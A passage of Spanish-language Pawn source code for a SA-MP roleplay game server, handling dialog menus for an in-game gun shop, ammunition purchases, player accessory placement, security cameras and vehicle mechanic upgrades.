				    Dialog(playerid,dComprarSaldo,DIALOG_STYLE_LIST,"COMPRAR SALDO - Elegir tarjeta","Tarjeta de 10$\nTarjeta de 30$\nTarjeta de 50$","Aceptar","Cancelar");
				}
				case 9:
				{
				    if(GetPlayerMoney(playerid) < 30) return Error(playerid,"¡Dinero insuficiente!");
				    AutoRol(playerid,"compra 5 hilos de seda, por $30.");
				    InfoJugador[playerid][jSeda] += 5;
				    QuitarDinero(playerid,30);
				}
			}
		}
		case dElejirArmCat:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
		            Dialog(playerid,dArmPistola,DIALOG_STYLE_LIST,""#CBLANCO"Pistolas",""#CINFO"> "#CBLANCO"9mm\t\t\t($200)\n"#CINFO"> "#CBLANCO"9mm + silenciador\t($250)\n"#CINFO"> "#CBLANCO"Desert eagle\t\t($450)","Aceptar","Cancelar");
		        }
				case 1:
				{
		            Dialog(playerid,dArmSubFusil,DIALOG_STYLE_LIST,""#CBLANCO"Sub-fusiles",""#CINFO"> "#CBLANCO"Uzi\t($2000)\n"#CINFO"> "#CBLANCO"Tec9\t($1500)\n"#CINFO"> "#CBLANCO"MP5\t($2100)","Aceptar","Cancelar");
				}
				case 2:
				{
		            Dialog(playerid,dArmEscopeta,DIALOG_STYLE_LIST,""#CBLANCO"Escopetas",""#CINFO"> "#CBLANCO"Escopeta\t\t($500)\n"#CINFO"> "#CBLANCO"Escopeta recortada\t($650)\n"#CINFO"> "#CBLANCO"Escopeta de combate\t($1000)","Aceptar","Cancelar");
				}
				case 3:
				{
		            Dialog(playerid,dArmAsalto,DIALOG_STYLE_LIST,""#CBLANCO"Fusiles de asalto",""#CINFO"> "#CBLANCO"AK-47\t($2500)\n"#CINFO"> "#CBLANCO"M4\t($3000)","Aceptar","Cancelar");
				}
				case 4:
				{
		            Dialog(playerid,dArmRifle,DIALOG_STYLE_LIST,""#CBLANCO"Rifles",""#CINFO"> "#CBLANCO"Rifle\t\t($900)\n"#CINFO"> "#CBLANCO"Sniper\t($4600)","Aceptar","Cancelar");
				}
				case 5:
				{
				    if(GetPlayerMoney(playerid) < 700) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una armadura, y se la coloca en el cuerpo");
					DarArmaduraGeneral(playerid,100);
					QuitarDinero(playerid,700);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 700;
					return 1;
				}
			}
		}
		case dArmPistola:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
				    if(GetPlayerMoney(playerid) < 200) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una pistola 9MM");
					GivePlayerWeapon(playerid,22,12);
					QuitarDinero(playerid,200);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 200;
					return 1;
				}
		        case 1:
		        {
				    if(GetPlayerMoney(playerid) < 250) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una pistola 9MM con silenciador");
					GivePlayerWeapon(playerid,23,12);
					QuitarDinero(playerid,250);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 250;
					return 1;
				}
		        case 2:
		        {
				    if(GetPlayerMoney(playerid) < 450) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una desert eagle");
					GivePlayerWeapon(playerid,24,7);
					QuitarDinero(playerid,450);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 450;
					return 1;
				}
			}
		}
		case dArmSubFusil:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
				    if(GetPlayerMoney(playerid) < 2000) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra un subfusil UZI");
					GivePlayerWeapon(playerid,28,32);
					QuitarDinero(playerid,2000);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 2000;
					return 1;
				}
		        case 1:
		        {
				    if(GetPlayerMoney(playerid) < 1500) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una Tec9");
					GivePlayerWeapon(playerid,32,32);
					QuitarDinero(playerid,1500);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 1500;
					return 1;
				}
		        case 2:
		        {
				    if(GetPlayerMoney(playerid) < 2100) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una MP5");
					GivePlayerWeapon(playerid,29,32);
					QuitarDinero(playerid,2100);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 2100;
					return 1;
				}
			}
		}
		case dArmEscopeta:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
				    if(GetPlayerMoney(playerid) < 500) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una escopeta");
					GivePlayerWeapon(playerid,25,12);
					QuitarDinero(playerid,500);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 500;
					return 1;
				}
		        case 1:
		        {
				    if(GetPlayerMoney(playerid) < 650) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una escopeta recortada");
					GivePlayerWeapon(playerid,26,12);
					QuitarDinero(playerid,650);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 650;
					return 1;
				}
		        case 2:
		        {
				    if(GetPlayerMoney(playerid) < 1000) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una escopeta de combate");
					GivePlayerWeapon(playerid,27,10);
					QuitarDinero(playerid,1000);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 1000;
					return 1;
				}
			}
		}
		case dArmAsalto:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
				    if(GetPlayerMoney(playerid) < 2500) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una AK-47");
					GivePlayerWeapon(playerid,30,20);
					QuitarDinero(playerid,2500);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 2500;
					return 1;
				}
		        case 1:
		        {
				    if(GetPlayerMoney(playerid) < 3000) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una M4");
					GivePlayerWeapon(playerid,31,20);
					QuitarDinero(playerid,3000);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 3000;
					return 1;
				}
			}
		}
		case dArmRifle:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
				    if(GetPlayerMoney(playerid) < 900) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra un rifle");
					GivePlayerWeapon(playerid,33,8);
					QuitarDinero(playerid,900);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 900;
					return 1;
				}
		        case 1:
		        {
				    if(GetPlayerMoney(playerid) < 4600) return Error(playerid,"¡No tienes dinero suficiente!");
					AutoRol(playerid,"compra una sniper");
					GivePlayerWeapon(playerid,34,5);
					QuitarDinero(playerid,4600);
					InfoNegocio[ID_Negocio(playerid)][nDinero] += 4600;
					return 1;
				}
			}
		}
		case dElejirArmBal:
		{
		    if(!response) return 1;
		    if(!listitem) return Dialog(playerid,dElejirArmCat,DIALOG_STYLE_LIST,""#CBLANCO"Elija la categoria",""#CINFO"> "#CBLANCO"Pistolas\n"#CINFO"> "#CBLANCO"Sub-fusiles\n"#CINFO"> "#CBLANCO"Escopeta\n"#CINFO"> "#CBLANCO"Fusil de asalto\n"#CINFO"> "#CBLANCO"Rifle\n"#CINFO"> "#CBLANCO"Comprar "#CAZUL2"ARMADURA\t"#CBLANCO"($700)","Comprar","Cancelar");
			else
			{
			    if(!GetPlayerWeapon(playerid)) return Error(playerid,"¡Para comprar balas debes tener un arma en la mano!");
				switch(GetPlayerWeapon(playerid))
				{
				    case 22,23,24,25,26,27,33,28,29,32,30,31,34:
				    {
						new Str[140],Weap[24];
						GetWeaponName(GetPlayerWeapon(playerid),Weap,sizeof Weap);
						A_Format(Str,""#CBLANCO"Cada bala para este arma "#CINFO"(%s)"#CBLANCO", vale "#CAZUL2"$%d\n"#CBLANCO"Escribe el número de balas que deseas comprar",Weap,PrecioBalaArma(GetPlayerWeapon(playerid)));
						Dialog(playerid,dComprarBalas,DIALOG_STYLE_INPUT,""#CBLANCO"Comprar balas",Str,"Comprar","Cancelar");
					}
					default: return Error(playerid,"¡No puedes comprar balas para este arma!");
				}
			}
		}
		case dComprarBalas:
		{
		    if(!response) return 1;
			if(strval(inputtext) < 1) return Error(playerid,"¡Debe ser un número positivo!");
			new Precio = strval(inputtext)*PrecioBalaArma(GetPlayerWeapon(playerid));
			if(GetPlayerMoney(playerid) < Precio) return Error(playerid,"¡No tienes suficiente dinero!");
			MensajeF(playerid,C_INFO,"> "#CBLANCO"Compraste %d balas para tu arma, por "#CAZUL2"$%d",strval(inputtext),Precio);
			GivePlayerWeapon(playerid,GetPlayerWeapon(playerid),strval(inputtext));
			QuitarDinero(playerid,Precio);
			InfoNegocio[ID_Negocio(playerid)][nDinero] += Precio;
		}
		case dElejirSlotA:
		{
		    if(!response) return DeletePVar(playerid,"ATTACH_MOD");
			new i = listitem;
			if(InfoJugador[playerid][jAttachModel][i]) return Error(playerid,"¡Ya tienes ese slot ocupado! "#CAZUL2"(/accesorios)");
			new pvar = GetPVarInt(playerid,"ATTACH_MOD");
			QuitarDinero(playerid,AttachmentObjects[pvar][attachprecio]);
			InfoJugador[playerid][jAttachModel][i] = AttachmentObjects[pvar][attachmodel];
			InfoJugador[playerid][jAccesorio][i] = pvar;
			InfoJugador[playerid][jAttachBone][i] = 2;
			InfoJugador[playerid][jAttachEscx][i] = 1.0;
			InfoJugador[playerid][jAttachEscy][i] = 1.0;
			InfoJugador[playerid][jAttachEscz][i] = 1.0;
			InfoJugador[playerid][jAttachOcultado][i] = false;
			Mensaje(playerid,C_INFO,"> "#CBLANCO"Puedes editar el accesorio "#CAZUL2"(/accesorios)");
			ActualizarAttach(playerid,i);
   			InfoNegocio[ID_Negocio(playerid)][nDinero] += AttachmentObjects[pvar][attachprecio];
			DeletePVar(playerid,"ATTACH_MOD");
			ActualizarAccesorios(playerid,i);
			return 1;
		}
		case dEAccesorios_0:
		{
		    if(!response) return 0;
		    if(!InfoJugador[playerid][jAttachModel][listitem]) return Error(playerid,"¡No tienes nada en ese slot!");
			EditarAccesorio(playerid,listitem);
			SetPVarInt(playerid,"OBJ_EDITAR",listitem);
			return 1;
		}
		case dEAccesorios_1:
		{
		    if(!response) return 0;
			switch(listitem)
			{
			    case 0:
				{
					ActualizarAttach(playerid,GetPVarInt(playerid,"OBJ_EDITAR"));
					EditAttachedObject(playerid,GetPVarInt(playerid,"OBJ_EDITAR"));
					Mensaje(playerid,-1,"Para poder mover la cámara, presione "#CAZUL2"~k~~PED_SPRINT~"#CBLANCO". Use "#CAZUL2"/headmove "#CBLANCO"para desactivar el movimiento de la cabeza.");
				}
				case 1:
				{
					new Str[350],Str2[28];
					Loop(i,sizeof AttachmentBones,0)
					{
						A_Format(Str2,"%s\n",AttachmentBones[i]);
						strcat(Str,Str2);
					}
					Dialog(playerid,dElejirParte,DIALOG_STYLE_LIST,""#CAZUL2"Elije la parte del cuerpo",Str,"Aceptar","Cancelar");
				}
				case 2: Dialog(playerid,dElejirPos_A,DIALOG_STYLE_LIST,""#CAZUL2"Editar accesorios - seleccione la posición","Casco\nReloj\nGorra\nBoina\nLentes\nPelo\nBandana","Aceptar","Cancelar");
				case 3:
				{
				    if(!InfoJugador[playerid][jAttachOcultado][GetPVarInt(playerid,"OBJ_EDITAR")])
				    {
					    InfoJugador[playerid][jAttachOcultado][GetPVarInt(playerid,"OBJ_EDITAR")] = true;
					    Mensaje(playerid,-1,"El objeto fue ocultado.");
					    RemovePlayerAttachedObject(playerid,GetPVarInt(playerid,"OBJ_EDITAR"));
					    ActualizarAccesorios(playerid,GetPVarInt(playerid,"OBJ_EDITAR"));
					}
					else
					{
					    InfoJugador[playerid][jAttachOcultado][GetPVarInt(playerid,"OBJ_EDITAR")] = false;
					    Mensaje(playerid,-1,"El objeto fue mostrado.");
					    ActualizarAttach(playerid,GetPVarInt(playerid,"OBJ_EDITAR"));
					    ActualizarAccesorios(playerid,GetPVarInt(playerid,"OBJ_EDITAR"));
					}
				}
				case 4:
				{
					Dialog(playerid,dConfirmarEA,DIALOG_STYLE_MSGBOX,""#CAZUL2"Eliminar accesorio",""#CBLANCO"¿Está segúro que desea "#CROJO"eliminar "#CBLANCO"su accesorio?","Sí","No");
				}
			}
		}
		case dElejirParte:
		{
		    if(!response) return 0;
		    InfoJugador[playerid][jAttachBone][GetPVarInt(playerid,"OBJ_EDITAR")] = listitem+1;
  			ActualizarAttach(playerid,GetPVarInt(playerid,"OBJ_EDITAR"));
  			ActualizarAccesorios(playerid,GetPVarInt(playerid,"OBJ_EDITAR"));
		}
		case dElejirPos_A:
		{
		    if(!response) return 1;
      		new S = GetPlayerSkin(playerid);
       		new i = GetPVarInt(playerid,"OBJ_EDITAR");
		    switch(listitem)
		    {
		        case 0://casco
		        {
		            AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i],2,POS_Accesorio_Casco[S][0],POS_Accesorio_Casco[S][1],POS_Accesorio_Casco[S][2],POS_Accesorio_Casco[S][3],POS_Accesorio_Casco[S][4],POS_Accesorio_Casco[S][5],POS_Accesorio_Casco[S][6],POS_Accesorio_Casco[S][7],POS_Accesorio_Casco[S][8]);
				}
				case 1://reloj
				{
		            AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i],5,POS_Accesorio_Reloj[S][0],POS_Accesorio_Reloj[S][1],POS_Accesorio_Reloj[S][2],POS_Accesorio_Reloj[S][3],POS_Accesorio_Reloj[S][4],POS_Accesorio_Reloj[S][5],POS_Accesorio_Reloj[S][6],POS_Accesorio_Reloj[S][7],POS_Accesorio_Reloj[S][8]);
				}
				case 2://Gorra
				{
		            AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i],2,POS_Accesorio_Gorra[S][0],POS_Accesorio_Gorra[S][1],POS_Accesorio_Gorra[S][2],POS_Accesorio_Gorra[S][3],POS_Accesorio_Gorra[S][4],POS_Accesorio_Gorra[S][5],POS_Accesorio_Gorra[S][6],POS_Accesorio_Gorra[S][7],POS_Accesorio_Gorra[S][8]);
				}
				case 3://Boina
				{
		            AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i],2,POS_Accesorio_Boina[S][0],POS_Accesorio_Boina[S][1],POS_Accesorio_Boina[S][2],POS_Accesorio_Boina[S][3],POS_Accesorio_Boina[S][4],POS_Accesorio_Boina[S][5],POS_Accesorio_Boina[S][6],POS_Accesorio_Boina[S][7],POS_Accesorio_Boina[S][8]);
				}
				case 4://Lentes
				{
		            AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i],2,POS_Accesorio_Lentes[S][0],POS_Accesorio_Lentes[S][1],POS_Accesorio_Lentes[S][2],POS_Accesorio_Lentes[S][3],POS_Accesorio_Lentes[S][4],POS_Accesorio_Lentes[S][5],POS_Accesorio_Lentes[S][6],1,1);
				}
				case 5://Pelo
				{
		            AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i],2,POS_Accesorio_Pelo[S][0],POS_Accesorio_Pelo[S][1],POS_Accesorio_Pelo[S][2],POS_Accesorio_Pelo[S][3],POS_Accesorio_Pelo[S][4],POS_Accesorio_Pelo[S][5],POS_Accesorio_Pelo[S][6],POS_Accesorio_Pelo[S][7],POS_Accesorio_Pelo[S][8]);
				}
				case 6://bandana
				{
				    switch(GetPlayerSkin(playerid))
				    {
				        case 115: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.075032, 0.039259, -0.009051, 272.667022, 0.000000, 268.155487); // Mask7 - skinsur115
						case 114: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.075032, 0.039259, -0.009051, 272.667022, 0.000000, 268.155487); // Mask7 - skinsur114
						case 116: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.075032, 0.039259, -0.009051, 272.667022, 0.000000, 268.155487); // Mask7 - skinsur116
						case 173: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.073774, 0.042118, -0.003368, 273.422515, 0.243100, 267.547058); // Mask7 - skinsur116
						case 174: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.073774, 0.042118, -0.003368, 273.422515, 0.243100, 267.547058); // Mask7 - skinsur116
						case 175: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.073774, 0.042118, -0.003368, 273.422515, 0.243100, 267.547058); // Mask7 - skinsur116
					    //groves
				        case 271: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.073522, 0.015061, -0.005912, 277.060668, 9.697027, 264.330200); // Mask3 - saveskinryder
						case 270: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.083064, 0.015061, 0.003734, 270.357788, 2.187248, 264.330200); // Mask3 - 270sweet
						case 269: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.083064, 0.017489, 0.002312, 270.357788, 2.187248, 266.944274); // Mask3 - smoke269
						case 105: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.078534, 0.041857, -0.001727, 268.970458, 1.533374, 269.223754); // Mask3 - tapadoskin 105 grove
						case 106: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.084321, 0.032509, -0.006748, 268.970458, 1.533374, 269.223754); // Mask3 - skin 106grove
						case 107: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.084321, 0.035590, -0.004405, 268.970458, 1.533374, 269.223754); // Mask3 - skin 107grove
						//Latinos
				        case 108: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.084809, 0.026987, 0.000924, 273.545745, 0.572601, 264.837554 ); // Mask6 - skinvago108
						case 109: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.081629, 0.035036, -0.006385, 273.545745, 0.572601, 264.837554 ); // Mask6 - skinvago 109
						case 110: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.073774, 0.042118, -0.003368, 273.422515, 0.243100, 267.547058 ); // Mask6 - skinvago110
						//Ballas
						case 102: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.076758, 0.034728, -0.001697, 267.582092, 359.936279, 265.333801 ); // Mask5 - skin102balla
						case 103: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.076758, 0.042026, 0.000579, 267.582092, 359.936279, 265.333801 ); // Mask5 - 103balla
						case 104: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.076758, 0.042026, 0.000579, 267.582092, 359.936279, 265.333801 ); // Mask5 - skin 104 balla
						case 293: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.079601, 0.019614, -0.006095, 272.025512, 0.136046, 268.165863 ); // Mask5 - oglock
						//Blood
						case 7:   AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.086248, 0.036498, -0.004328, 270.304412, 359.126678, 266.091674 ); // Mask2 - blood - 7
						case 67:  AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.086248, 0.020672, 0.001285, 270.304412, 359.126678, 266.091674 ); // Mask2 - blood - 67
						case 180: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.084799, 0.039217, -0.007458, 270.304412, 359.126678, 271.452209 ); // Mask2 - blood- 180
						case 19:  AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.081000, 0.026039, -0.004144, 270.304412, 359.126678, 271.452209 ); // Mask2 - blood - 19
						case 144: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.110470, 0.043788, -0.002435, 266.909606, 358.832275, 267.704956 ); // Bandana2 - 144 - blood
					    //Moteros
						case 23:  AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.082504, 0.038338, -0.005320, 271.407196, 356.295104, 267.907989 ); // Mask2 - skin 100 motero
						case 247: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.088066, 0.038264, 0.000398, 271.407196, 356.295104, 267.907989 ); // Mask2 - skin 247 - motoquero
						case 248: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.088066, 0.038264, 0.000398, 271.407196, 356.295104, 267.907989 ); // Mask2 - skin 248 - motoquero
						case 100: AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.088066, 0.038264, 0.000398, 271.407196, 356.295104, 267.907989 ); // Mask2 - skin 248 - motoquero
						case 33:  AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.041866, 0.015547, -0.001428, 271.371276, 356.919921, 269.937591 ); // Mask2 - skin BIEN 33
						default:  AttachObject(playerid,i,InfoJugador[playerid][jAttachModel][i], 2, 0.041866, 0.015547, -0.001428, 271.371276, 356.919921, 269.937591 ); // Mask2 - skin BIEN 33
					}
				}
			}
			if(InfoJugador[playerid][jAttachPosx][i] != 0.0)
				Mensaje(playerid,-1,"> Objeto ajustado "#CVERDE"correctamente "#CBLANCO"a la posición indicada.");

			else
			    Mensaje(playerid,-1,"> El servidor no encontró una posición para ese accesorio.");

		}
		case dConfirmarEA:
		{
		    if(!response) return 0;
		    else
		    {
		        new i = GetPVarInt(playerid,"OBJ_EDITAR");
		        InfoJugador[playerid][jAccesorio][i] = 0;
		    	InfoJugador[playerid][jAttachModel][i] = 0;
				InfoJugador[playerid][jAttachBone][i] = 2;
				InfoJugador[playerid][jAttachPosx][i] = 0;
				InfoJugador[playerid][jAttachPosy][i] = 0;
				InfoJugador[playerid][jAttachPosz][i] = 0;
				InfoJugador[playerid][jAttachAngx][i] = 0;
				InfoJugador[playerid][jAttachAngy][i] = 0;
				InfoJugador[playerid][jAttachAngz][i] = 0;
				InfoJugador[playerid][jAttachEscx][i] = 1;
				InfoJugador[playerid][jAttachEscy][i] = 1;
				InfoJugador[playerid][jAttachEscz][i] = 1;
				InfoJugador[playerid][jAttachOcultado][i] = false;
    			RemovePlayerAttachedObject(playerid,i);
    			ActualizarAccesorios(playerid,i);
			}
		}
		case dCamarasLSPD:
		{
		    if(!response) return 1;
		    SetPVarInt(playerid,"UsandoCamaras_SEG",1);
		    Loop(i,4,0) TextDrawShowForPlayer(playerid,CAMARA_Seg[i]);
			TogglePlayerSpectating(playerid, true);
		    SetPlayerInterior(playerid,InfoCamara[listitem][CamInt]);
		    AttachCameraToObject(playerid,OBJ_Camara[listitem]);
		    Mensaje(playerid,C_INFO,"> "#CBLANCO"Para dejar de utilizar la cámara, utiliza "#CINFO"/dejar camara");
		    return 1;
		}
		case dMMecanicos_0:
		{
		    if(!response) return 1;
			switch(listitem)
			{
			    case 0: Dialog(playerid,dMMecanicos_1,DIALOG_STYLE_INPUT,"Pintura",""#CBLANCO"Coloca la "#CAZUL2"ID o número "#CBLANCO"de la Pintura","Aceptar","Cancelar");
				case 1: Dialog(playerid,dMMecanicos_2,DIALOG_STYLE_LIST,"Componentes","> Llantas\n> Suspensión hidráulica\n> Nitro\n> Alerones\n> Parachoques","Aceptar","Salir");
				case 2: Dialog(playerid,dMMecanicos_3,DIALOG_STYLE_LIST,"Reparación","Reparar motor\nReparar carroceria\nReparar todo (motor y carroceria)","Aceptar","Salir");
			}
		}
		case dMMecanicos_1:
		{
		    if(!response) return 1;
        	PlayerPlaySound(playerid, 1134, 0, 0, 0);
			ChangeVehicleColor(GetPlayerVehicleID(playerid),strval(inputtext),0);
			Mensaje(playerid,-1,"Vehículo pintado.");
			if(VehVenta_ID(GetPlayerVehicleID(playerid))) ActualizarVehiculo(VehVenta_ID(GetPlayerVehicleID(playerid)));
			return 1;
		}
		case dMMecanicos_2:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0: Dialog(playerid,dMMecanicos_2_0,DIALOG_STYLE_LIST,""#CBLANCO"Elija las llantas","Mega\nShadow\nClassic\nGrove\nDollar\nAtomic\nWires\nSwitch\nImport","Aceptar","Salir");
				case 1:
				{
		            PlayerPlaySound(playerid, 1133, 0, 0, 0);
		        	Mensaje(playerid,-1,"Suspensión hidráulica agregada.");
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1087);
				}
				case 2: Dialog(playerid,dMMecanicos_2_1,DIALOG_STYLE_LIST,"Nitros","Nitro x2\nNitro x5\nNitro x10","Aceptar","Salir");
				case 3: Dialog(playerid,dMMecanicos_2_2,DIALOG_STYLE_LIST,"Alerones","Alerones Pro\nAlerones Win\nAlerones Drag\nAlerones Alpha\nAlerones Champ\nAlerones Race\nAlerones Worx\nAlerones Fury","Aceptar","Cancelar");
				case 4:
				{
    				new Modelo = GetPlayerVehicleID(playerid);
		            if(GetVehicleModel(Modelo) >= 558 && GetVehicleModel(Modelo) <= 562 || GetVehicleModel(Modelo) == 565 || GetVehicleModel(Modelo) == 566 || GetVehicleModel(Modelo) == 567 || GetVehicleModel(Modelo) == 575 || GetVehicleModel(Modelo) == 566 || GetVehicleModel(Modelo) == 536 || GetVehicleModel(Modelo) == 535)
		            {
		            	Dialog(playerid,dMMecanicos_2_3,DIALOG_STYLE_LIST,"Parachoques","Juego de Parachoques Tornado\nJuego de Parachoques Slamvan\nJuego de Parachoques Sultan\nJuego de Parachoques Elegy\nJuego de Parachoques Flash\nJuego de Parachoques Stratum\nJuego de Parachoques Jester\nJuego de Parachoques Uranus\nJuego de Parachoques Broadway\nJuego de Parachoques Remington\nJuego de Parachoques Blade\nJuego de Parachoques Savanna","Aceptar","Salir");
			            return 1;
					}
					return Error(playerid,"Debes estar en un vehículo TUNEABLE, como "#CINFO"Sultan, Uranus, Jester, Alpha, Savanna ETC");
				}
			}
 			return 1;
		}
		case dMMecanicos_2_0:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1074);
				case 1: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1073);
				case 2: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1077);
				case 3: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1081);
				case 4: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1083);
				case 5: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1085);
				case 6: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1076);
				case 7: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1080);
				case 8: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1082);
			}
   			PlayerPlaySound(playerid, 1133, 0, 0, 0);
			return 1;
		}
		case dMMecanicos_2_1:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1009);
				case 1: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1008);
				case 2: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1010);
			}
   			PlayerPlaySound(playerid, 1133, 0, 0, 0);
			return 1;
		}
		case dMMecanicos_2_2:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1000);
				case 1:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1001);
				case 2:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1002);
				case 3:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1003);
				case 4:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1014);
				case 5:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1015);
				case 6:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1016);
				case 7:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1023);
				case 8:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1049);
				case 9:  AddVehicleComponentEx(GetPlayerVehicleID(playerid),1050);
				case 10: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1058);
				case 11: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1060);
				case 12: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1138);
				case 13: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1139);
				case 14: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1146);
				case 15: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1147);
				case 16: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1158);
				case 17: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1162);
				case 18: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1163);
				case 19: AddVehicleComponentEx(GetPlayerVehicleID(playerid),1164);
            }
    		PlayerPlaySound(playerid, 1133, 0, 0, 0);
			return 1;
		}
		case dMMecanicos_2_3:
		{
			if(!response) return 1;
			switch(listitem)
			{
	   			case 0: // Tornado -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1191);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1192);
				}
				case 1: //Slamvan -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1109);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1115);
				}
				case 2: //Sultan -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1141);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1169);
				}
				case 3: // Elegy -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1172);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1148);
				}
				case 4: //Flash -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1150);
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1153);
				}
				case 5: //Stratum -
		        {
		            AddVehicleComponentEx(GetPlayerVehicleID(playerid),1154);
